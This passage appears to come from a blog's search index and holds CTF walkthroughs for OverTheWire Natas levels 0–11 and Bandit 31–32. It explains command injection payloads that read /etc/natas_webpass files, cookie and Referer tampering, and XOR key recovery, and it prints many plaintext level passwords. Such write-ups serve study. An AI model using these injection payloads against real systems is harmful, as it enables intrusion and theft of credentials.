what the initial array looks like in json.\nThe output of the function is the array : {\u0026ldquo;showpassword\u0026rdquo;:\u0026ldquo;no\u0026rdquo;,\u0026ldquo;bgcolor\u0026rdquo;:\u0026quot;#ffffff\u0026quot;}. Remember the cookie from earlier? This is the step where it comes in. Using the CyberChef website, I will firstly apply URL decoding on the cookie value (to convert URL specific values to their numeric values) and then apply the steps present in the code in reverse order.\nNow that we have the decoded cookie and we have the output (the json format array) we could find the key since in XOR decryption, knowing 2 values out of the {initial,key,result} gives you access to finding the 3rd unknown value (look at my drawing).\nNow all there`s left to do since we found a repeating key is get a new cookie coming from the array that has the no value changed to yes. By changing the cookie value with the value we got after this process should pass to the program the modified string and grant us access to the next level. Of course, a way simpler sollution would be reversing the encryption script in your own php file and running it to use the array values of your choice and it will spit out the correct cookie, but where`s the fun in that? :) ","date":"2024-08-21T11:56:21+03:00","permalink":"//localhost:1313/post/natas11/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 11"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas10\nPassword: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu\nURL: http://natas10.natas.labs.overthewire.org\nDoc What is command injection?\nCommand injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.\nThis attack differs from Code Injection, in that code injection allows the attacker to add their own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code.\nSolution This is basically the same index file as the one from natas9.\nLet`s inspect the source code: \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas10\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;\u0026lt;censored\u0026gt;\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas10\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; For security reasons, we now filter on certain characters\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;form\u0026gt; Find words containing: \u0026lt;input name=needle\u0026gt;\u0026lt;input type=submit name=submit value=Search\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/form\u0026gt; Output: \u0026lt;pre\u0026gt; \u0026lt;? $key = \u0026#34;\u0026#34;; if(array_key_exists(\u0026#34;needle\u0026#34;, $_REQUEST)) { $key = $_REQUEST[\u0026#34;needle\u0026#34;]; } if($key != \u0026#34;\u0026#34;) { if(preg_match(\u0026#39;/[;|\u0026amp;]/\u0026#39;,$key)) { print \u0026#34;Input contains an illegal character!\u0026#34;; } else { passthru(\u0026#34;grep -i $key dictionary.txt\u0026#34;); } } ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\nEven though this looks very similar to what we did last time, there`s a big difference at play.\nif(preg_match(\u0026#39;/[;|\u0026amp;]/\u0026#39;,$key)) { print \u0026#34;Input contains an illegal character!\u0026#34;; This line of code makes us unable to run multiple commands in the same line in order to get the command injection we hope for. There`s still hope left tho since we can actually take advantage of the grep function by applying grep to a command.\na cat /etc/natas_webpass/natas11 I had no ideea why after that, there was still no ouput for the password. After looking at the code one more time I realized that right now, I am using grep on /etc/natas_webpass/natas11/. Just then I realized that in order for the command injection to work, the grep function should be able to find the provided string in the target. Since we have the flag -i (dont keep track of uppercase or lowercase) and 2 more tries, it seems like the letter \u0026ldquo;e\u0026rdquo; is included in the flag and it is findable. That`s enough to solve this level.\n","date":"2024-08-20T17:01:43+03:00","permalink":"//localhost:1313/post/natas10/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 10"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas9\nPassword: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t\nURL: http://natas9.natas.labs.overthewire.org\nDoc What is command injection?\nCommand injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.\nThis attack differs from Code Injection, in that code injection allows the attacker to add their own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code.\nSolution Again we are prompted with a text field, a submit and the source code. This time the program does something different tho. Instead of asking for a password, it works more like a function in the sense that is searches for something somewhere.\nLet`s inspect the source code: \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas9\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;\u0026lt;censored\u0026gt;\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas9\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;form\u0026gt; Find words containing: \u0026lt;input name=needle\u0026gt;\u0026lt;input type=submit name=submit value=Search\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/form\u0026gt; Output: \u0026lt;pre\u0026gt; \u0026lt;? $key = \u0026#34;\u0026#34;; if(array_key_exists(\u0026#34;needle\u0026#34;, $_REQUEST)) { $key = $_REQUEST[\u0026#34;needle\u0026#34;]; } if($key != \u0026#34;\u0026#34;) { passthru(\u0026#34;grep -i $key dictionary.txt\u0026#34;); } ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\nThe logic behind this whole ordeal goes like this :\n-You insert a key\n-The program checks if there is actually a key in the field\n-If it is, the key parameter takes the value of your input\n-Your value get`s passed to passthru(\u0026ldquo;grep -i $key dictionary.txt\u0026rdquo;);\nThat last part was very important and it is gonna be the key to all of this. Because it passes your key as an argument in a grep command that is being run, you can perform something called command injection. It means you are executing commands through a way you are not supposed to. If we use a ;, we can delimitate commands and make them abe to be run from the same line.\nThis all basically adds up to \u0026ldquo;I will give it a random input, sepparate with ; and then run whatever I want\u0026rdquo;. In this case, it is gonna be the same cat of the password file. a ; cat /etc/natas_webpass/natas10\nExecuting this command will solve natas9.\n","date":"2024-08-20T16:29:39+03:00","permalink":"//localhost:1313/post/natas9/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 9"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas8\nPassword: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q\nURL: http://natas8.natas.labs.overthewire.org\nDoc What is Binary?\nA binary number is a number expressed in the base-2 numeral system or binary numeral system, a method for representing numbers that uses only two symbols for the natural numbers: typically \u0026ldquo;0\u0026rdquo; and \u0026ldquo;1\u0026rdquo;.\nWhat is Hex?\nHex Encoding is a popular method for encoding data that is widely used by developers to improve data security. This encoding method helps to make data more secure by converting binary data into ASCII or Unicode text that can be transmitted over networks or stored in databases.\nStrrev\nThe strrev() function is a built-in function in C and is defined in string.h header file. The strrev() function is used to reverse the given string.\nWhat is base64?\nIn computer programming, Base64 is a group of binary-to-text encoding schemes that transforms binary data into a sequence of printable characters, limited to a set of 64 unique characters. More specifically, the source binary data is taken 6 bits at a time, then this group of 6 bits is mapped to one of 64 unique characters.\nSolution At the first sight, this level seems identical to natas6 in the fact that there`s a secret field and a source link.\nThis time tough, there are no inclusions to other files. The source: \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas8\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;\u0026lt;censored\u0026gt;\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas8\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;? $encodedSecret = \u0026#34;3d3d516343746d4d6d6c315669563362\u0026#34;; function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); } if(array_key_exists(\u0026#34;submit\u0026#34;, $_POST)) { if(encodeSecret($_POST[\u0026#39;secret\u0026#39;]) == $encodedSecret) { print \u0026#34;Access granted. The password for natas9 is \u0026lt;censored\u0026gt;\u0026#34;; } else { print \u0026#34;Wrong secret\u0026#34;; } } ?\u0026gt; \u0026lt;form method=post\u0026gt; Input secret: \u0026lt;input name=secret\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=submit name=submit\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Even though the solution is pretty straight forward, it requires a small bit of C knowledge and how a programming language operates. In the source file, you can see that there is a variable present named encodedSecret and following the if statement, the website processes your answer through the encodeSecrete function and then compares the outcume with the encodedSecret given.\nThe encryption process is pretty straight forward. It takes your input, puts it in base 64, reverses the string and then converts the binary code into hex code. By utilizing some free online tools, it is pretty easy to reverse the process starting from the given secret and get the expect output for the code to pass.\nStep 1 : bin2hex Step 2 : Reverse the string Step 3 : Base64 decode After all this steps are completed, you can insert the resulted string into the secret field in order to obtain the flag.\n","date":"2024-08-20T15:26:33+03:00","permalink":"//localhost:1313/post/natas8/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 8"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas7\nPassword: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS\nURL: http://natas7.natas.labs.overthewire.org\nDoc What is php\nPHP is a general-purpose scripting language geared towards web development. It was originally created by Danish-Canadian programmer Rasmus Lerdorf in 1993 and released in 1995. The PHP reference implementation is now produced by the PHP Group.\nSolution At the first look, there is nothing on this page exept 2 hyperlinks that both point to a page named Home, About respectivly.\nLet`s inspect the page and see what lies behind.\nIt seems like the argument after page gets passed to the index.php script in order to display the contents of the page which is a big vulnerability since that means that we can run pretty much anything we please. There`s also a hint that the password we are after is stored in /etc/natas_webpass/natas8, same format as in the Bandit wargame if you have followed that. Alltogether, putting the adress of the file in which the password is stored should spit out it`s contents and grant us access to the next level.\n","date":"2024-08-20T15:10:38+03:00","permalink":"//localhost:1313/post/natas7/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 7"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas6\nPassword: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned\nURL: http://natas6.natas.labs.overthewire.org\nDoc What is C?\nC is a general-purpose programming language created by Dennis Ritchie at the Bell Laboratories in 1972.\nIt is a very popular language, despite being old. The main reason for its popularity is because it is a fundamental language in the field of computer science.\nC is strongly associated with UNIX, as it was developed to write the UNIX operating system.\nSolution This time, there`s no need for looking at the website`s guts or packets, there is already a button there that brings you the source of what happens behind and a field that is asking for a secret in order to progress to the next level.\nThe source: \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas6\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;\u0026lt;censored\u0026gt;\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas6\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;? include \u0026#34;includes/secret.inc\u0026#34;; if(array_key_exists(\u0026#34;submit\u0026#34;, $_POST)) { if($secret == $_POST[\u0026#39;secret\u0026#39;]) { print \u0026#34;Access granted. The password for natas7 is \u0026lt;censored\u0026gt;\u0026#34;; } else { print \u0026#34;Wrong secret\u0026#34;; } } ?\u0026gt; \u0026lt;form method=post\u0026gt; Input secret: \u0026lt;input name=secret\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=submit name=submit\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\nThe include argument in C includes libraries and files in order for them to be used in the current context. Looking at the second half part of the source document, we can see that it includes a file at includes/secret.inc. Let`s follow the trace to it in order to see what we can find.\nIt seems like that file explicitly contains the secret that is being compared against your input in the code snippet. Inputing it into the field at the index of natas6 should give us access further. ","date":"2024-08-20T14:14:57+03:00","permalink":"//localhost:1313/post/natas6/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 6"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas5\nPassword: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK\nURL: http://natas5.natas.labs.overthewire.org\nDoc Burp Suite is a proprietary software tool for security assessment and penetration testing of web applications. It software was initially developed in 2003-2006 by Dafydd Stuttard to automate his own security testing needs, after realizing the capabilities of automatable web tools like Selenium.\nSource.\nBurp Suite tutorial and usefull guides:\nPort Swigger.\nWhat is a proxy server?\nA proxy server is a system or router that provides a gateway between users and the internet. Therefore, it helps prevent cyber attackers from entering a private network. It is a server, referred to as an “intermediary” because it goes between end-users and the web pages they visit online.\nWhen a computer connects to the internet, it uses an IP address. This is similar to your home’s street address, telling incoming data where to go and marking outgoing data with a return address for other devices to authenticate. A proxy server is essentially a computer on the internet that has an IP address of its own.\nSource.\nSolution Logging in for the first time, we get a simple prompt: Access disallowed. You are not logged in This time, we are gonna do pretty much what we`ve been doing until now with the inspect element tool but use the intercept function of Burp suite in order to see what is being received and what type of data is being sent. Reloading the page while having the intersect option tuned on should do the trick. GET / HTTP/1.1 Host: natas5.natas.labs.overthewire.org Cache-Control: max-age=0 Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L Accept-Language: en-US Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Cookie: loggedin=0 Connection: keep-alive There is nothing out of the ordinary in the HTTP Request but after a closer look, there is a line loggedin=0 stored as a cookie. What is a cookie? Changing the value from false into true and sending the packet will grant us access and gain us the ability to get to the next level. ","date":"2024-08-20T14:02:37+03:00","permalink":"//localhost:1313/post/natas5/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 5"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas4\nPassword: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ\nURL: http://natas4.natas.labs.overthewire.org\nTools From here on out, simply inspecting the page won`t be sufficient in order to solve these level. We will need to make use of some networking tools in order to perform certain actions and exploit vulnerabilities. The primary tool I will be using will be Burp suite. If you are on linux, install the package correspondent to your distribution. Otherwise follow the download and install page on portswigger. As always, and this is valid for any tool, feel free to use whatever software you want or can get your hands onto as long as it has the necessary abilities to complete the task at hand, however, the documentation and solution will be provided in accordance to the tools I use.\nDoc Burp Suite is a proprietary software tool for security assessment and penetration testing of web applications. It software was initially developed in 2003-2006 by Dafydd Stuttard to automate his own security testing needs, after realizing the capabilities of automatable web tools like Selenium.\nSource.\nBurp Suite tutorial and usefull guides:\nPort Swigger.\nWhat is a proxy server?\nA proxy server is a system or router that provides a gateway between users and the internet. Therefore, it helps prevent cyber attackers from entering a private network. It is a server, referred to as an “intermediary” because it goes between end-users and the web pages they visit online.\nWhen a computer connects to the internet, it uses an IP address. This is similar to your home’s street address, telling incoming data where to go and marking outgoing data with a return address for other devices to authenticate. A proxy server is essentially a computer on the internet that has an IP address of its own.\nSource.\nSolution After connecting to the webpage with the credentials gained from natas3, we are prompted with a display that states that our access request is prohibeted and that the site only accepts requests from the address http://natas5.natas.labs.overthewire.org.\nAltough this seems like a monumental impediment, the only thing stopping us from getting access to the service is modifying our request to be made from the provided adress. Firstly, let`s open the proxy tab and intercept the messages when hitting refresh. Now, we`ve gotta modify the Referer on the HTTP Request in order for it to have the source of http://natas5.natas.labs.overthewire.org.\nAfter modification: Now, pressing Forward will redirect the package back to the page as if it was coming from http://natas5.natas.labs.overthewire.org, giving us access to the page. ","date":"2024-08-20T12:52:52+03:00","permalink":"//localhost:1313/post/natas4/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 4"},{"categories":["Overthewire","Natas"],"contents":"Solution idea Hammer of thor\nLogin Username: natas3\nPassword: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH\nURL: http://natas3.natas.labs.overthewire.org\nDoc What is inspect element?\nInspect element is a feature of modern web browsers that enables anyone to view and edit a website’s source code, including its HTML, CSS, JavaScript, and media files. When the source code is modified with the inspect tool, the changes are shown live inside the browser window.\nHow is a webpage structured?\nSolution By inspecting the page, you can see a text snippet that says : \u0026lt;!-- No more information leaks!! Not even Google will find it this time... --\u0026gt;\nSo that makes me start thinking about search engines. In a nutshell the robots.txt file on a webpage tells search engines which directories not to enter.\nRobots.txt directory: User-agent: * Disallow: /s3cr3t/ After that, by navigating to the s3cr3t tab, the information for natas4 should be present there.\n/s3cr3t/users.txt: natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ\n","date":"2024-08-20T12:15:26+03:00","permalink":"//localhost:1313/post/natas3/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 3"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas2\nPassword: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI\nURL: http://natas2.natas.labs.overthewire.org\nDoc What is inspect element?\nInspect element is a feature of modern web browsers that enables anyone to view and edit a website’s source code, including its HTML, CSS, JavaScript, and media files. When the source code is modified with the inspect tool, the changes are shown live inside the browser window.\nHow is a webpage structured?\nSolution At the first entry on the page, we are prompted with the text \u0026ldquo;There is nothing on this page\u0026rdquo;. Surprisingly, this time that is actually correct. After a quick inspection we can see that the dot at the end of the sentance is actually an image. This wouldn`t be very uselfull usually but in the img tag, we can see that the image is locally hosted and we are prompted with the actual location of the image. If you understand how a webpage is structured, you can see that it is possible to navigate the contents if you know what you are looking for.\nThere seems to be a file index at /files. After navigating to that directory, there seems to be a users.txt file present that contains the credentials for natas3. users.txt: # username:password alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH eve:zo4mJWyNj2 mallory:9urtcpzBmH","date":"2024-08-20T11:34:10+03:00","permalink":"//localhost:1313/post/natas2/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 2"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas1\nPassword: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq\nURL: http://natas1.natas.labs.overthewire.org\nDoc What is inspect element?\nInspect element is a feature of modern web browsers that enables anyone to view and edit a website’s source code, including its HTML, CSS, JavaScript, and media files. When the source code is modified with the inspect tool, the changes are shown live inside the browser window.\nSolution As per the previous level, this is gonna be an incredibly simple sollution. You are prompted with the text that just like before, the password is hidden in the webpage. The difference now is that you cannot right click on the page in order to inspect it. You can still use Ctrl+Shift+i or whatever bind you would have on your browser to enter inspect mode and that`s about it.\n","date":"2024-08-20T10:17:35+03:00","permalink":"//localhost:1313/post/natas1/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 1"},{"categories":["Overthewire","Natas"],"contents":"Introduction This is the introductory level for the \u0026ldquo;Natas\u0026rdquo; wargame hosted by Overthewire\nWhat is Natas? Natas teaches the basics of serverside web-security.\nEach level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.\nEach level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5. Source\nThere will be no level goals for this wargame, just get in and mess around.\nLogin Username: natas0\nPassword: natas0\nURL: http://natas0.natas.labs.overthewire.org\nDoc What is inspect element?\nInspect element is a feature of modern web browsers that enables anyone to view and edit a website’s source code, including its HTML, CSS, JavaScript, and media files. When the source code is modified with the inspect tool, the changes are shown live inside the browser window.\nSolution Let`s connect to the provided URL with the given credentials. Immediatly we are hit with a prompt saying that the password for the next level is located in this webpage.\nThe first thing you want to do when you don`t know what to do in order to progress further is to inspect the webpage you suspect could have a clue and sniff around the guts of the page to see what you can find. In this case, because this is the first level, the password is just there and that`s it! Use it for natas1.\n","date":"2024-08-19T22:46:42+03:00","permalink":"//localhost:1313/post/natas0/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 0"},{"categories":["Overthewire","Bandit"],"contents":"Level goal After all this git stuff, it’s time for another escape. Good luck!\nLogin ssh bandit32@bandit.labs.overthewire.org -p 2220\n3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K\nSolution Since running any command shows $1, which means we could get into another shell. After that, we can see that our associated user is bandit33 wich means we can cat the password for the next level. WELCOME TO THE UPPERCASE SHELL \u0026gt;\u0026gt; $0 $ whoami bandit33 $ cat /etc/bandit_pass/bandit33 tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0\nAt this moment, there are no more levels to play in this game. However, we are constantly working on new levels and will most likely expand this game with more levels soon. Keep an eye out for an announcement on our usual communication channels! In the meantime, you could play some of our other wargames.\n","date":"2024-08-18T22:49:34+03:00","permalink":"//localhost:1313/post/bandit32/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 32"},{"categories":["Overthewire","Bandit"],"contents":"Level goal There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo via the port 2220. The password for the user bandit31-git is the same as for the user bandit31.\nClone the repository and find the password for the next level.\nLogin ssh bandit30@bandit.labs.overthewire.org -p 2220\nqp30ex3VLz5MDG1n91YowTv4Q8l7CDZL\nDoc git (1) - the stupid content tracker GIT DOCUMENTATION Solution For this level I`ll use the same initial process I`ve used until now.\nClone-\u0026gt;Check what`s in the repo-\u0026gt;try to find a password. bandit31@bandit:~$ mktemp -d /tmp/tmp.yfyYU2PWtI bandit31@bandit:~$ cd /tmp/tmp.yfyYU2PWtI bandit31@bandit:/tmp/tmp.yfyYU2PWtI$ git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo Cloning into \u0026#39;repo\u0026#39;... The authenticity of host \u0026#39;[localhost]:2220 ([127.0.0.1]:2220)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory \u0026#39;/home/bandit31/.ssh\u0026#39; (Permission denied). Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost\u0026#39;s password: remote: Enumerating objects: 4, done. remote: Counting objects: 100% (4/4), done. remote: Compressing objects: 100% (3/3), done. remote: Total 4 (delta 0), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (4/4), done. bandit31@bandit:/tmp/tmp.yfyYU2PWtI$ ls repo bandit31@bandit:/tmp/tmp.yfyYU2PWtI$ cd repo/ bandit31@bandit:/tmp/tmp.yfyYU2PWtI/repo$ cat README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: \u0026#39;May I come in?\u0026#39; Branch: master\nSeems like this time we need to push a file named key.txt to master. That can be achieved by using the structure:\ngit add git commit git push Let`s create a file and push it.\nbandit31@bandit:/tmp/tmp.yfyYU2PWtI/repo$ touch key.txt bandit31@bandit:/tmp/tmp.yfyYU2PWtI/repo$ echo \u0026#34;May I come in?\u0026#34; \u0026gt; key.txt bandit31@bandit:/tmp/tmp.yfyYU2PWtI/repo$ cat key.txt May I come in? bandit31@bandit:/tmp/tmp.yfyYU2PWtI/repo$ git add . bandit31@bandit:/tmp/tmp.yfyYU2PWtI/repo$ git commit -m \u0026#34;test\u0026#34; [master 1aaff63] test 